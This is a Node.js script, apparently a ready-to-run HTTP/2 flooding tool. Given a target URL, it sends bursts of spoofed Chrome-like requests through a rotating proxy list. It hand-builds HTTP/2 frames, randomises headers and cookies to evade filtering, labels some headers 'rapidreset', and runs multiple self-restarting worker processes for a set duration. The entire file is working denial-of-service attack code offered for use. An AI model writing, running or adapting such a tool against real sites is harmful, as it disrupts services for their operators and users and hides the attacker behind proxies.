const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const [target, time, threads, ratelimit, proxyfile] = process.argv.slice(2);
const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').split('\n')

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    let payload = ""

    if (length > 0) {
        payload = data.subarray(9, 9 + length)

        if (payload.length != length)
            return null
    }

    return {
        length,
        type,
        payload
    }
}

function getRandomToken(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let token = '';
    for (let i = 0; i < length; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
}

function getRandomValue(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {

        netSocket.once('data', () => {
            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http1/1.1'],
                servername: url.host,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3'
            }, () => {
                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()             
                hpack.setTableSize(4096)
        
                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(474753, 0)
				
				const frandom = Math.floor(Math.random() * 3);
				const headertablesize = Math.floor(Math.random() * 2) + 65535;
				let windowSize = headertablesize;
				let fchoicev1;
				let fchoicev2;
				
				if (frandom == 0) {
					fchoicev1 = 131072;
					fchoicev2 = 262144;
				} else if (frandom == 1) {
					fchoicev1 = 131071;
					fchoicev2 = 262143;
				} else {
					fchoicev1 = 131073;
					fchoicev2 = 262143;
				}						
        
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, headertablesize],
                        [2, 0],
                        [4, fchoicev1],
                        [6, fchoicev2]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ]
        
                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])
                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 0) {
                                windowSize -= frame.length

                                if (windowSize < 60000) {
                                    let incWindow = 65536 - windowSize
                                    windowSize += incWindow
                                    const updateWindow = Buffer.alloc(4)
                                    updateWindow.writeUInt32BE(incWindow, 0)

                                    tlsSocket.write(encodeFrame(0, 8, updateWindow))
                                }
                            }
        
                            if (frame.type == 7) {
                                tlsSocket.end(() => {
                                    tlsSocket.destroy()
                                })
                            }
        
                        } else {
                            break
                        }
                    }
                })
        
                tlsSocket.write(Buffer.concat(frames))
  
                function doWrite() {
					if (streamId >= 32) {
						netSocket.destroy();
						return
					}					
                    if (tlsSocket.destroyed) {
                        return
					}						
        
                    const requests = []
                    for (let i = 0; i < ratelimit; i++) {
						const cookie_val = `${getRandomToken(10)}=${getRandomToken(10)}`;
						const referer_val = `https://${url.hostname}/${getRandomToken(10)}`;
						const uaVersion = (Math.floor(Math.random() * (117 - 116 + 1)) + 116).toFixed(1);
						
                        const headers = Object.entries({
                            ':method': 'GET',
                            ':authority': url.hostname,
                            ':scheme': 'https',
                            ':path': url.pathname
						}).concat(Object.entries({
							'sec-ch-ua': `"Chromium";v="${uaVersion}", "Not)A;Brand";v="${Math.floor(Math.random() * 92) + 8}", "Google Chrome";v="${uaVersion}"`,
							'sec-ch-ua-mobile': '?0',
							'sec-ch-ua-platform': `"Windows"`,
							'upgrade-insecure-requests': '1',
							'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${uaVersion}.0.0.0 Safari/537.36`,
							'accept': `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,**;q=0.8,application/signed-exchange;v=b3;q=0.7`,
							...(Math.random() < 0.5 && {'sec-fetch-site': 'same-origin'}),
							...(Math.random() < 0.5 && {'sec-fetch-mode': 'navigate'}),
							...(Math.random() < 0.5 && {'sec-fetch-user': '?0'}),
							...(Math.random() < 0.5 && {'sec-fetch-dest': 'document'}),
							'accept-encoding': 'gzip, deflate, br',
							"accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
							...(Math.random() < 0.5 && {"cookie-g": cookie_val}), 
							...(Math.random() < 0.5 && {"g-cookie-g": cookie_val}), 		
							...(Math.random() < 0.5 && {"referer": referer_val}), 
							...(Math.random() < 0.5 && {"referer-g": referer_val}), 
							...(Math.random() < 0.5 && {"g-referer-g": referer_val}),  
							...(Math.random() < 0.5 && {"s-rapidreset": "rapidreset"}),
							...(Math.random() < 0.5 && {"s-rapidreset-s": "rapidresetv2"}), 								
							...(Math.random() < 0.5 && {"x-rapidreset": getRandomToken(10)}),
							...(Math.random() < 0.5 && {"x-rapidreset-g": getRandomToken(10)}),
							...(Math.random() < 0.5 && {"g-rapidreset-g": getRandomToken(10)}),										
                        }).filter(a => a[1] != null))

        
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headers)
                        ])
            
                        requests.push(encodeFrame(streamId, 1, packed, 1 | 4 | 0x20));				
                        streamId += 2									
                    }
            
                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWrite()
                            }, 1000)
                        }
                    })
                }
        
                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })
    
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: keep-alive\r\n\r\n`)
    
    }).once('error', () => {}).once('close', () => {
        go()
    })
}

if (cluster.isMaster) {
	Array.from({length: threads}, (_, i) => cluster.fork({core: i % os.cpus().length}));

	cluster.on('exit', (worker) => {
		console.log(`Worker ${worker.process.pid} died. Restarting...`);
		cluster.fork({core: worker.id % os.cpus().length});
	});

	setTimeout(() => process.exit(console.log('Primary process exiting...')), time * 1000);

} else {
	setInterval(go);
	setTimeout(() => process.exit(console.log(`Worker ${process.pid} exiting...`)), time * 1000);
}
